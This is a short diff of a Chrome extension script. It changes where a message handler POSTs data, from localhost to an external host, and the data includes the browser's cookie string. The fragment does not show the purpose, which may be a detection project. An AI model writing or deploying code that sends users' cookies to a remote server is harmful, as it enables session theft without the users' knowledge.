@@ -14,7 +14,7 @@ chrome.runtime.onMessage.addListener(function (message) {
 
             message.body.cookie = cookiestr
 
-            fetch("http://localhost:8080/submit", {
+            fetch("https://apcs-detection-frontend.hop.sh/submit", {
                 method: "POST",
                 body: JSON.stringify(message.body)
             })
